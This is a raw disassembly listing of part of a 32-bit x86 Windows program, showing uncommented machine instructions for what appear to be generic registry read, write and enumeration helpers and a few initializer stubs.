  405cd7:	39 35 c4 1a 41 00    	cmp    %esi,0x411ac4
  405cdd:	74 36                	je     0x405d15
  405cdf:	39 35 c8 1a 41 00    	cmp    %esi,0x411ac8
  405ce5:	74 2e                	je     0x405d15
  405ce7:	3b c6                	cmp    %esi,%eax
  405ce9:	74 2a                	je     0x405d15
  405ceb:	56                   	push   %esi
  405cec:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405cef:	c6 05 bc 1a 41 00 01 	movb   $0x1,0x411abc
  405cf6:	e8 64 be ff ff       	call   0x401b5f
  405cfb:	83 ec 10             	sub    $0x10,%esp
  405cfe:	8b cc                	mov    %esp,%ecx
  405d00:	50                   	push   %eax
  405d01:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405d07:	6a 76                	push   $0x76
  405d09:	8b cb                	mov    %ebx,%ecx
  405d0b:	e8 1a b4 ff ff       	call   0x40112a
  405d10:	e9 88 00 00 00       	jmp    0x405d9d
  405d15:	83 ec 10             	sub    $0x10,%esp
  405d18:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405d1b:	8b d4                	mov    %esp,%edx
  405d1d:	68 30 dc 40 00       	push   $0x40dc30
  405d22:	57                   	push   %edi
  405d23:	56                   	push   %esi
  405d24:	89 55 08             	mov    %edx,0x8(%ebp)
  405d27:	e8 33 be ff ff       	call   0x401b5f
  405d2c:	50                   	push   %eax
  405d2d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405d30:	50                   	push   %eax
  405d31:	e8 82 69 00 00       	call   0x40c6b8
  405d36:	83 c4 0c             	add    $0xc,%esp
  405d39:	50                   	push   %eax
  405d3a:	8b 45 08             	mov    0x8(%ebp),%eax
  405d3d:	50                   	push   %eax
  405d3e:	e8 5d 69 00 00       	call   0x40c6a0
  405d43:	83 c4 0c             	add    $0xc,%esp
  405d46:	8b cb                	mov    %ebx,%ecx
  405d48:	68 85 00 00 00       	push   $0x85
  405d4d:	e8 d8 b3 ff ff       	call   0x40112a
  405d52:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405d55:	eb 40                	jmp    0x405d97
  405d57:	83 ec 10             	sub    $0x10,%esp
  405d5a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405d5d:	8b d4                	mov    %esp,%edx
  405d5f:	68 20 d6 40 00       	push   $0x40d620
  405d64:	57                   	push   %edi
  405d65:	56                   	push   %esi
  405d66:	89 55 08             	mov    %edx,0x8(%ebp)
  405d69:	e8 f1 bd ff ff       	call   0x401b5f
  405d6e:	50                   	push   %eax
  405d6f:	8d 45 b0             	lea    -0x50(%ebp),%eax
  405d72:	50                   	push   %eax
  405d73:	e8 40 69 00 00       	call   0x40c6b8
  405d78:	83 c4 0c             	add    $0xc,%esp
  405d7b:	50                   	push   %eax
  405d7c:	8b 45 08             	mov    0x8(%ebp),%eax
  405d7f:	50                   	push   %eax
  405d80:	e8 1b 69 00 00       	call   0x40c6a0
  405d85:	83 c4 0c             	add    $0xc,%esp
  405d88:	8b cb                	mov    %ebx,%ecx
  405d8a:	68 85 00 00 00       	push   $0x85
  405d8f:	e8 96 b3 ff ff       	call   0x40112a
  405d94:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405d97:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405d9d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405da0:	e8 8b bd ff ff       	call   0x401b30
  405da5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405da8:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405dae:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405db1:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405db7:	5f                   	pop    %edi
  405db8:	5e                   	pop    %esi
  405db9:	33 c0                	xor    %eax,%eax
  405dbb:	5b                   	pop    %ebx
  405dbc:	c9                   	leave
  405dbd:	c2 04 00             	ret    $0x4
  405dc0:	55                   	push   %ebp
  405dc1:	8b ec                	mov    %esp,%ebp
  405dc3:	51                   	push   %ecx
  405dc4:	51                   	push   %ecx
  405dc5:	6a 04                	push   $0x4
  405dc7:	58                   	pop    %eax
  405dc8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405dcb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405dce:	8d 45 0c             	lea    0xc(%ebp),%eax
  405dd1:	50                   	push   %eax
  405dd2:	68 19 00 02 00       	push   $0x20019
  405dd7:	6a 00                	push   $0x0
  405dd9:	ff 75 0c             	push   0xc(%ebp)
  405ddc:	ff 75 08             	push   0x8(%ebp)
  405ddf:	ff 15 30 d0 40 00    	call   *0x40d030
  405de5:	85 c0                	test   %eax,%eax
  405de7:	75 2d                	jne    0x405e16
  405de9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405dec:	56                   	push   %esi
  405ded:	50                   	push   %eax
  405dee:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405df1:	ff 75 14             	push   0x14(%ebp)
  405df4:	50                   	push   %eax
  405df5:	6a 00                	push   $0x0
  405df7:	ff 75 10             	push   0x10(%ebp)
  405dfa:	ff 75 0c             	push   0xc(%ebp)
  405dfd:	ff 15 38 d0 40 00    	call   *0x40d038
  405e03:	ff 75 0c             	push   0xc(%ebp)
  405e06:	8b f0                	mov    %eax,%esi
  405e08:	ff 15 34 d0 40 00    	call   *0x40d034
  405e0e:	85 f6                	test   %esi,%esi
  405e10:	0f 94 c0             	sete   %al
  405e13:	5e                   	pop    %esi
  405e14:	c9                   	leave
  405e15:	c3                   	ret
  405e16:	32 c0                	xor    %al,%al
  405e18:	c9                   	leave
  405e19:	c3                   	ret
  405e1a:	55                   	push   %ebp
  405e1b:	8b ec                	mov    %esp,%ebp
  405e1d:	81 ec 04 04 00 00    	sub    $0x404,%esp
  405e23:	53                   	push   %ebx
  405e24:	33 db                	xor    %ebx,%ebx
  405e26:	38 5d 18             	cmp    %bl,0x18(%ebp)
  405e29:	8d 45 10             	lea    0x10(%ebp),%eax
  405e2c:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  405e33:	50                   	push   %eax
  405e34:	75 07                	jne    0x405e3d
  405e36:	68 19 00 02 00       	push   $0x20019
  405e3b:	eb 05                	jmp    0x405e42
  405e3d:	68 19 01 02 00       	push   $0x20119
  405e42:	53                   	push   %ebx
  405e43:	ff 75 10             	push   0x10(%ebp)
  405e46:	ff 75 0c             	push   0xc(%ebp)
  405e49:	ff 15 30 d0 40 00    	call   *0x40d030
  405e4f:	3b c3                	cmp    %ebx,%eax
  405e51:	75 2f                	jne    0x405e82
  405e53:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405e56:	50                   	push   %eax
  405e57:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  405e5d:	50                   	push   %eax
  405e5e:	53                   	push   %ebx
  405e5f:	53                   	push   %ebx
  405e60:	ff 75 14             	push   0x14(%ebp)
  405e63:	ff 75 10             	push   0x10(%ebp)
  405e66:	ff 15 38 d0 40 00    	call   *0x40d038
  405e6c:	ff 75 10             	push   0x10(%ebp)
  405e6f:	ff 15 34 d0 40 00    	call   *0x40d034
  405e75:	8d 45 1b             	lea    0x1b(%ebp),%eax
  405e78:	50                   	push   %eax
  405e79:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  405e7f:	50                   	push   %eax
  405e80:	eb 09                	jmp    0x405e8b
  405e82:	8d 45 1b             	lea    0x1b(%ebp),%eax
  405e85:	50                   	push   %eax
  405e86:	68 a0 d4 40 00       	push   $0x40d4a0
  405e8b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405e8e:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  405e94:	8b 45 08             	mov    0x8(%ebp),%eax
  405e97:	5b                   	pop    %ebx
  405e98:	c9                   	leave
  405e99:	c3                   	ret
  405e9a:	55                   	push   %ebp
  405e9b:	8b ec                	mov    %esp,%ebp
  405e9d:	51                   	push   %ecx
  405e9e:	51                   	push   %ecx
  405e9f:	53                   	push   %ebx
  405ea0:	56                   	push   %esi
  405ea1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405ea4:	57                   	push   %edi
  405ea5:	33 ff                	xor    %edi,%edi
  405ea7:	50                   	push   %eax
  405ea8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405eab:	57                   	push   %edi
  405eac:	8b 35 3c d0 40 00    	mov    0x40d03c,%esi
  405eb2:	50                   	push   %eax
  405eb3:	57                   	push   %edi
  405eb4:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405eb7:	ff 75 10             	push   0x10(%ebp)
  405eba:	bb a0 d4 40 00       	mov    $0x40d4a0,%ebx
  405ebf:	ff 75 0c             	push   0xc(%ebp)
  405ec2:	ff d6                	call   *%esi
  405ec4:	85 c0                	test   %eax,%eax
  405ec6:	75 39                	jne    0x405f01
  405ec8:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  405ecb:	76 34                	jbe    0x405f01
  405ecd:	ff 75 fc             	push   -0x4(%ebp)
  405ed0:	ff 15 7c d3 40 00    	call   *0x40d37c
  405ed6:	59                   	pop    %ecx
  405ed7:	8b d8                	mov    %eax,%ebx
  405ed9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405edc:	33 c0                	xor    %eax,%eax
  405ede:	8b d1                	mov    %ecx,%edx
  405ee0:	8b fb                	mov    %ebx,%edi
  405ee2:	c1 e9 02             	shr    $0x2,%ecx
  405ee5:	f3 ab                	rep stos %eax,%es:(%edi)
  405ee7:	8b ca                	mov    %edx,%ecx
  405ee9:	83 e1 03             	and    $0x3,%ecx
  405eec:	f3 aa                	rep stos %al,%es:(%edi)
  405eee:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405ef1:	50                   	push   %eax
  405ef2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ef5:	53                   	push   %ebx
  405ef6:	50                   	push   %eax
  405ef7:	6a 00                	push   $0x0
  405ef9:	ff 75 10             	push   0x10(%ebp)
  405efc:	ff 75 0c             	push   0xc(%ebp)
  405eff:	ff d6                	call   *%esi
  405f01:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405f04:	8d 45 13             	lea    0x13(%ebp),%eax
  405f07:	50                   	push   %eax
  405f08:	53                   	push   %ebx
  405f09:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  405f0f:	8b 45 08             	mov    0x8(%ebp),%eax
  405f12:	5f                   	pop    %edi
  405f13:	5e                   	pop    %esi
  405f14:	5b                   	pop    %ebx
  405f15:	c9                   	leave
  405f16:	c3                   	ret
  405f17:	55                   	push   %ebp
  405f18:	8b ec                	mov    %esp,%ebp
  405f1a:	81 ec 00 04 00 00    	sub    $0x400,%esp
  405f20:	8d 45 0c             	lea    0xc(%ebp),%eax
  405f23:	50                   	push   %eax
  405f24:	68 19 00 02 00       	push   $0x20019
  405f29:	6a 00                	push   $0x0
  405f2b:	ff 75 0c             	push   0xc(%ebp)
  405f2e:	ff 75 08             	push   0x8(%ebp)
  405f31:	ff 15 30 d0 40 00    	call   *0x40d030
  405f37:	85 c0                	test   %eax,%eax
  405f39:	75 4e                	jne    0x405f89
  405f3b:	8d 45 18             	lea    0x18(%ebp),%eax
  405f3e:	57                   	push   %edi
  405f3f:	50                   	push   %eax
  405f40:	ff 75 14             	push   0x14(%ebp)
  405f43:	6a 00                	push   $0x0
  405f45:	6a 00                	push   $0x0
  405f47:	ff 75 10             	push   0x10(%ebp)
  405f4a:	ff 75 0c             	push   0xc(%ebp)
  405f4d:	ff 15 38 d0 40 00    	call   *0x40d038
  405f53:	ff 75 0c             	push   0xc(%ebp)
  405f56:	8b f8                	mov    %eax,%edi
  405f58:	ff 15 34 d0 40 00    	call   *0x40d034
  405f5e:	85 ff                	test   %edi,%edi
  405f60:	5f                   	pop    %edi
  405f61:	75 26                	jne    0x405f89
  405f63:	ff 75 20             	push   0x20(%ebp)
  405f66:	8d 8d 00 fc ff ff    	lea    -0x400(%ebp),%ecx
  405f6c:	ff 75 1c             	push   0x1c(%ebp)
  405f6f:	e8 09 c1 ff ff       	call   0x40207d
  405f74:	ff 75 18             	push   0x18(%ebp)
  405f77:	8d 8d 00 fc ff ff    	lea    -0x400(%ebp),%ecx
  405f7d:	ff 75 14             	push   0x14(%ebp)
  405f80:	e8 6d c1 ff ff       	call   0x4020f2
  405f85:	b0 01                	mov    $0x1,%al
  405f87:	c9                   	leave
  405f88:	c3                   	ret
  405f89:	32 c0                	xor    %al,%al
  405f8b:	c9                   	leave
  405f8c:	c3                   	ret
  405f8d:	55                   	push   %ebp
  405f8e:	8b ec                	mov    %esp,%ebp
  405f90:	8d 45 0c             	lea    0xc(%ebp),%eax
  405f93:	50                   	push   %eax
  405f94:	ff 75 0c             	push   0xc(%ebp)
  405f97:	ff 75 08             	push   0x8(%ebp)
  405f9a:	ff 15 48 d0 40 00    	call   *0x40d048
  405fa0:	85 c0                	test   %eax,%eax
  405fa2:	75 48                	jne    0x405fec
  405fa4:	53                   	push   %ebx
  405fa5:	56                   	push   %esi
  405fa6:	8d 4d 14             	lea    0x14(%ebp),%ecx
  405fa9:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  405faf:	50                   	push   %eax
  405fb0:	8d 4d 14             	lea    0x14(%ebp),%ecx
  405fb3:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  405fb9:	50                   	push   %eax
  405fba:	33 db                	xor    %ebx,%ebx
  405fbc:	ff 75 24             	push   0x24(%ebp)
  405fbf:	53                   	push   %ebx
  405fc0:	ff 75 10             	push   0x10(%ebp)
  405fc3:	ff 75 0c             	push   0xc(%ebp)
  405fc6:	ff 15 44 d0 40 00    	call   *0x40d044
  405fcc:	ff 75 0c             	push   0xc(%ebp)
  405fcf:	8b f0                	mov    %eax,%esi
  405fd1:	ff 15 34 d0 40 00    	call   *0x40d034
  405fd7:	3b f3                	cmp    %ebx,%esi
  405fd9:	75 02                	jne    0x405fdd
  405fdb:	b3 01                	mov    $0x1,%bl
  405fdd:	8d 4d 14             	lea    0x14(%ebp),%ecx
  405fe0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405fe6:	8a c3                	mov    %bl,%al
  405fe8:	5e                   	pop    %esi
  405fe9:	5b                   	pop    %ebx
  405fea:	5d                   	pop    %ebp
  405feb:	c3                   	ret
  405fec:	8d 4d 14             	lea    0x14(%ebp),%ecx
  405fef:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405ff5:	32 c0                	xor    %al,%al
  405ff7:	5d                   	pop    %ebp
  405ff8:	c3                   	ret
  405ff9:	55                   	push   %ebp
  405ffa:	8b ec                	mov    %esp,%ebp
  405ffc:	8d 45 0c             	lea    0xc(%ebp),%eax
  405fff:	50                   	push   %eax
  406000:	ff 75 0c             	push   0xc(%ebp)
  406003:	ff 75 08             	push   0x8(%ebp)
  406006:	ff 15 00 d0 40 00    	call   *0x40d000
  40600c:	85 c0                	test   %eax,%eax
  40600e:	75 2a                	jne    0x40603a
  406010:	56                   	push   %esi
  406011:	ff 75 18             	push   0x18(%ebp)
  406014:	ff 75 14             	push   0x14(%ebp)
  406017:	ff 75 1c             	push   0x1c(%ebp)
  40601a:	50                   	push   %eax
  40601b:	ff 75 10             	push   0x10(%ebp)
  40601e:	ff 75 0c             	push   0xc(%ebp)
  406021:	ff 15 4c d0 40 00    	call   *0x40d04c
  406027:	ff 75 0c             	push   0xc(%ebp)
  40602a:	8b f0                	mov    %eax,%esi
  40602c:	ff 15 34 d0 40 00    	call   *0x40d034
  406032:	85 f6                	test   %esi,%esi
  406034:	0f 94 c0             	sete   %al
  406037:	5e                   	pop    %esi
  406038:	5d                   	pop    %ebp
  406039:	c3                   	ret
  40603a:	32 c0                	xor    %al,%al
  40603c:	5d                   	pop    %ebp
  40603d:	c3                   	ret
  40603e:	55                   	push   %ebp
  40603f:	8b ec                	mov    %esp,%ebp
  406041:	8d 45 0c             	lea    0xc(%ebp),%eax
  406044:	50                   	push   %eax
  406045:	ff 75 0c             	push   0xc(%ebp)
  406048:	ff 75 08             	push   0x8(%ebp)
  40604b:	ff 15 00 d0 40 00    	call   *0x40d000
  406051:	85 c0                	test   %eax,%eax
  406053:	75 4c                	jne    0x4060a1
  406055:	53                   	push   %ebx
  406056:	56                   	push   %esi
  406057:	8d 4d 14             	lea    0x14(%ebp),%ecx
  40605a:	ff 15 38 d2 40 00    	call   *0x40d238
  406060:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  406064:	8d 4d 14             	lea    0x14(%ebp),%ecx
  406067:	50                   	push   %eax
  406068:	ff 15 98 d2 40 00    	call   *0x40d298
  40606e:	50                   	push   %eax
  40606f:	33 db                	xor    %ebx,%ebx
  406071:	ff 75 24             	push   0x24(%ebp)
  406074:	53                   	push   %ebx
  406075:	ff 75 10             	push   0x10(%ebp)
  406078:	ff 75 0c             	push   0xc(%ebp)
  40607b:	ff 15 4c d0 40 00    	call   *0x40d04c
  406081:	ff 75 0c             	push   0xc(%ebp)
  406084:	8b f0                	mov    %eax,%esi
  406086:	ff 15 34 d0 40 00    	call   *0x40d034
  40608c:	3b f3                	cmp    %ebx,%esi
  40608e:	75 02                	jne    0x406092
  406090:	b3 01                	mov    $0x1,%bl
  406092:	8d 4d 14             	lea    0x14(%ebp),%ecx
  406095:	ff 15 9c d2 40 00    	call   *0x40d29c
  40609b:	8a c3                	mov    %bl,%al
  40609d:	5e                   	pop    %esi
  40609e:	5b                   	pop    %ebx
  40609f:	5d                   	pop    %ebp
  4060a0:	c3                   	ret
  4060a1:	8d 4d 14             	lea    0x14(%ebp),%ecx
  4060a4:	ff 15 9c d2 40 00    	call   *0x40d29c
  4060aa:	32 c0                	xor    %al,%al
  4060ac:	5d                   	pop    %ebp
  4060ad:	c3                   	ret
  4060ae:	55                   	push   %ebp
  4060af:	8b ec                	mov    %esp,%ebp
  4060b1:	8d 45 0c             	lea    0xc(%ebp),%eax
  4060b4:	50                   	push   %eax
  4060b5:	ff 75 0c             	push   0xc(%ebp)
  4060b8:	ff 75 08             	push   0x8(%ebp)
  4060bb:	ff 15 00 d0 40 00    	call   *0x40d000
  4060c1:	85 c0                	test   %eax,%eax
  4060c3:	75 2a                	jne    0x4060ef
  4060c5:	56                   	push   %esi
  4060c6:	8d 45 14             	lea    0x14(%ebp),%eax
  4060c9:	6a 04                	push   $0x4
  4060cb:	50                   	push   %eax
  4060cc:	6a 04                	push   $0x4
  4060ce:	6a 00                	push   $0x0
  4060d0:	ff 75 10             	push   0x10(%ebp)
  4060d3:	ff 75 0c             	push   0xc(%ebp)
  4060d6:	ff 15 4c d0 40 00    	call   *0x40d04c
  4060dc:	ff 75 0c             	push   0xc(%ebp)
  4060df:	8b f0                	mov    %eax,%esi
  4060e1:	ff 15 34 d0 40 00    	call   *0x40d034
  4060e7:	85 f6                	test   %esi,%esi
  4060e9:	0f 94 c0             	sete   %al
  4060ec:	5e                   	pop    %esi
  4060ed:	5d                   	pop    %ebp
  4060ee:	c3                   	ret
  4060ef:	32 c0                	xor    %al,%al
  4060f1:	5d                   	pop    %ebp
  4060f2:	c3                   	ret
  4060f3:	55                   	push   %ebp
  4060f4:	8b ec                	mov    %esp,%ebp
  4060f6:	8d 45 0c             	lea    0xc(%ebp),%eax
  4060f9:	50                   	push   %eax
  4060fa:	ff 75 0c             	push   0xc(%ebp)
  4060fd:	ff 75 08             	push   0x8(%ebp)
  406100:	ff 15 00 d0 40 00    	call   *0x40d000
  406106:	85 c0                	test   %eax,%eax
  406108:	75 2a                	jne    0x406134
  40610a:	56                   	push   %esi
  40610b:	8d 45 14             	lea    0x14(%ebp),%eax
  40610e:	6a 08                	push   $0x8
  406110:	50                   	push   %eax
  406111:	6a 0b                	push   $0xb
  406113:	6a 00                	push   $0x0
  406115:	ff 75 10             	push   0x10(%ebp)
  406118:	ff 75 0c             	push   0xc(%ebp)
  40611b:	ff 15 4c d0 40 00    	call   *0x40d04c
  406121:	ff 75 0c             	push   0xc(%ebp)
  406124:	8b f0                	mov    %eax,%esi
  406126:	ff 15 34 d0 40 00    	call   *0x40d034
  40612c:	85 f6                	test   %esi,%esi
  40612e:	0f 94 c0             	sete   %al
  406131:	5e                   	pop    %esi
  406132:	5d                   	pop    %ebp
  406133:	c3                   	ret
  406134:	32 c0                	xor    %al,%al
  406136:	5d                   	pop    %ebp
  406137:	c3                   	ret
  406138:	55                   	push   %ebp
  406139:	8b ec                	mov    %esp,%ebp
  40613b:	81 ec 10 04 00 00    	sub    $0x410,%esp
  406141:	53                   	push   %ebx
  406142:	8d 8d f0 fb ff ff    	lea    -0x410(%ebp),%ecx
  406148:	ff 75 20             	push   0x20(%ebp)
  40614b:	ff 75 1c             	push   0x1c(%ebp)
  40614e:	e8 2a bf ff ff       	call   0x40207d
  406153:	ff 75 18             	push   0x18(%ebp)
  406156:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406159:	8d 8d f0 fb ff ff    	lea    -0x410(%ebp),%ecx
  40615f:	ff 75 14             	push   0x14(%ebp)
  406162:	50                   	push   %eax
  406163:	e8 18 c0 ff ff       	call   0x402180
  406168:	ff 75 24             	push   0x24(%ebp)
  40616b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40616e:	83 ec 10             	sub    $0x10,%esp
  406171:	8b cc                	mov    %esp,%ecx
  406173:	50                   	push   %eax
  406174:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40617a:	ff 75 10             	push   0x10(%ebp)
  40617d:	ff 75 0c             	push   0xc(%ebp)
  406180:	ff 75 08             	push   0x8(%ebp)
  406183:	e8 05 fe ff ff       	call   0x405f8d
  406188:	83 c4 20             	add    $0x20,%esp
  40618b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40618e:	8a d8                	mov    %al,%bl
  406190:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406196:	8a c3                	mov    %bl,%al
  406198:	5b                   	pop    %ebx
  406199:	c9                   	leave
  40619a:	c3                   	ret
  40619b:	55                   	push   %ebp
  40619c:	8b ec                	mov    %esp,%ebp
  40619e:	8d 45 0c             	lea    0xc(%ebp),%eax
  4061a1:	50                   	push   %eax
  4061a2:	6a 02                	push   $0x2
  4061a4:	6a 00                	push   $0x0
  4061a6:	ff 75 0c             	push   0xc(%ebp)
  4061a9:	ff 75 08             	push   0x8(%ebp)
  4061ac:	ff 15 40 d0 40 00    	call   *0x40d040
  4061b2:	85 c0                	test   %eax,%eax
  4061b4:	74 04                	je     0x4061ba
  4061b6:	32 c0                	xor    %al,%al
  4061b8:	5d                   	pop    %ebp
  4061b9:	c3                   	ret
  4061ba:	ff 75 10             	push   0x10(%ebp)
  4061bd:	ff 75 0c             	push   0xc(%ebp)
  4061c0:	ff 15 50 d0 40 00    	call   *0x40d050
  4061c6:	f7 d8                	neg    %eax
  4061c8:	1a c0                	sbb    %al,%al
  4061ca:	fe c0                	inc    %al
  4061cc:	5d                   	pop    %ebp
  4061cd:	c3                   	ret
  4061ce:	e8 05 00 00 00       	call   0x4061d8
  4061d3:	e9 15 00 00 00       	jmp    0x4061ed
  4061d8:	55                   	push   %ebp
  4061d9:	8b ec                	mov    %esp,%ebp
  4061db:	51                   	push   %ecx
  4061dc:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4061df:	b9 d8 1a 41 00       	mov    $0x411ad8,%ecx
  4061e4:	50                   	push   %eax
  4061e5:	ff 15 20 d2 40 00    	call   *0x40d220
  4061eb:	c9                   	leave
  4061ec:	c3                   	ret
  4061ed:	68 f9 61 40 00       	push   $0x4061f9
  4061f2:	e8 c1 61 00 00       	call   0x40c3b8
  4061f7:	59                   	pop    %ecx
  4061f8:	c3                   	ret
  4061f9:	b9 d8 1a 41 00       	mov    $0x411ad8,%ecx
  4061fe:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  406204:	e8 05 00 00 00       	call   0x40620e
  406209:	e9 15 00 00 00       	jmp    0x406223
  40620e:	55                   	push   %ebp
  40620f:	8b ec                	mov    %esp,%ebp
  406211:	51                   	push   %ecx
  406212:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406215:	b9 40 1b 41 00       	mov    $0x411b40,%ecx
  40621a:	50                   	push   %eax
  40621b:	ff 15 20 d2 40 00    	call   *0x40d220
  406221:	c9                   	leave
  406222:	c3                   	ret
  406223:	68 2f 62 40 00       	push   $0x40622f
  406228:	e8 8b 61 00 00       	call   0x40c3b8
  40622d:	59                   	pop    %ecx
  40622e:	c3                   	ret
  40622f:	b9 40 1b 41 00       	mov    $0x411b40,%ecx
  406234:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  40623a:	e8 05 00 00 00       	call   0x406244
  40623f:	e9 15 00 00 00       	jmp    0x406259
  406244:	55                   	push   %ebp
  406245:	8b ec                	mov    %esp,%ebp
  406247:	51                   	push   %ecx
  406248:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40624b:	b9 30 1b 41 00       	mov    $0x411b30,%ecx
  406250:	50                   	push   %eax
  406251:	ff 15 dc d2 40 00    	call   *0x40d2dc
  406257:	c9                   	leave
  406258:	c3                   	ret
  406259:	68 65 62 40 00       	push   $0x406265
  40625e:	e8 55 61 00 00       	call   0x40c3b8
  406263:	59                   	pop    %ecx
  406264:	c3                   	ret
  406265:	b9 30 1b 41 00       	mov    $0x411b30,%ecx
  40626a:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  406270:	e8 05 00 00 00       	call   0x40627a
  406275:	e9 15 00 00 00       	jmp    0x40628f
  40627a:	55                   	push   %ebp
  40627b:	8b ec                	mov    %esp,%ebp
  40627d:	51                   	push   %ecx
  40627e:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406281:	b9 50 1b 41 00       	mov    $0x411b50,%ecx
  406286:	50                   	push   %eax
  406287:	ff 15 dc d2 40 00    	call   *0x40d2dc
  40628d:	c9                   	leave
  40628e:	c3                   	ret
  40628f:	68 9b 62 40 00       	push   $0x40629b
  406294:	e8 1f 61 00 00       	call   0x40c3b8
  406299:	59                   	pop    %ecx
  40629a:	c3                   	ret
  40629b:	b9 50 1b 41 00       	mov    $0x411b50,%ecx
  4062a0:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  4062a6:	e8 05 00 00 00       	call   0x4062b0
  4062ab:	e9 0d 00 00 00       	jmp    0x4062bd
  4062b0:	6a 00                	push   $0x0
  4062b2:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  4062b7:	e8 bc ad ff ff       	call   0x401078
  4062bc:	c3                   	ret
  4062bd:	68 c9 62 40 00       	push   $0x4062c9
  4062c2:	e8 f1 60 00 00       	call   0x40c3b8
  4062c7:	59                   	pop    %ecx
  4062c8:	c3                   	ret
  4062c9:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  4062ce:	e9 98 ae ff ff       	jmp    0x40116b
  4062d3:	55                   	push   %ebp
  4062d4:	8b ec                	mov    %esp,%ebp
  4062d6:	b8 dc ab 00 00       	mov    $0xabdc,%eax
  4062db:	e8 20 61 00 00       	call   0x40c400
  4062e0:	66 a1 b8 d8 40 00    	mov    0x40d8b8,%ax
  4062e6:	53                   	push   %ebx
  4062e7:	57                   	push   %edi
  4062e8:	66 89 85 34 fd ff ff 	mov    %ax,-0x2cc(%ebp)
  4062ef:	b9 81 00 00 00       	mov    $0x81,%ecx
  4062f4:	33 c0                	xor    %eax,%eax
  4062f6:	8d bd 36 fd ff ff    	lea    -0x2ca(%ebp),%edi
  4062fc:	33 db                	xor    %ebx,%ebx
  4062fe:	f3 ab                	rep stos %eax,%es:(%edi)
  406300:	66 ab                	stos   %ax,%es:(%edi)
  406302:	8d 45 b8             	lea    -0x48(%ebp),%eax
  406305:	c7 45 d8 04 01 00 00 	movl   $0x104,-0x28(%ebp)
  40630c:	50                   	push   %eax
  40630d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  406310:	50                   	push   %eax
  406311:	8d 45 b0             	lea    -0x50(%ebp),%eax
  406314:	50                   	push   %eax
  406315:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  406318:	50                   	push   %eax
  406319:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40631c:	50                   	push   %eax
  40631d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  406320:	50                   	push   %eax
  406321:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406324:	50                   	push   %eax
  406325:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406328:	50                   	push   %eax
  406329:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40632c:	53                   	push   %ebx
  40632d:	50                   	push   %eax
  40632e:	8d 85 34 fd ff ff    	lea    -0x2cc(%ebp),%eax
  406334:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  406337:	50                   	push   %eax
  406338:	c7 45 e4 ff 3f 00 00 	movl   $0x3fff,-0x1c(%ebp)
  40633f:	ff 75 08             	push   0x8(%ebp)
  406342:	ff 15 5c d0 40 00    	call   *0x40d05c
  406348:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40634b:	74 78                	je     0x4063c5
  40634d:	33 ff                	xor    %edi,%edi
  40634f:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  406352:	76 71                	jbe    0x4063c5
  406354:	8d 45 b8             	lea    -0x48(%ebp),%eax
  406357:	c7 45 e0 ff 00 00 00 	movl   $0xff,-0x20(%ebp)
  40635e:	50                   	push   %eax
  40635f:	53                   	push   %ebx
  406360:	53                   	push   %ebx
  406361:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406364:	53                   	push   %ebx
  406365:	50                   	push   %eax
  406366:	8d 85 34 fb ff ff    	lea    -0x4cc(%ebp),%eax
  40636c:	50                   	push   %eax
  40636d:	57                   	push   %edi
  40636e:	ff 75 08             	push   0x8(%ebp)
  406371:	ff 15 58 d0 40 00    	call   *0x40d058
